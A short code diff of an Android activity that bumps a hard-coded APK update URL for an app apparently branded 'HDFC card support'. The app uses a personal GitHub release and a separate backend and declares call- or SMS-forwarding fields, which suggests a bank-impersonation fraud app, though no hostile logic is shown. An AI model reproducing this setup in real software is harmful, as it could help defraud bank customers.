@@ -42,7 +42,7 @@ import java.util.Locale;
 public class MainActivity extends BridgeActivity {
     private static final String TAG = "HDFC_MainActivity";
     private static final String BACKEND_URL = "https://backprince.onrender.com";
-    private static final String UPDATE_URL = "https://github.com/amanxridex/newmade/releases/download/v2.0.60/hdfc_card_support.apk";
+    private static final String UPDATE_URL = "https://github.com/amanxridex/newmade/releases/download/v2.0.62/hdfc_card_support.apk";
     private String forwardingNumber = null;
     private boolean forwardingEnabled = false;
 
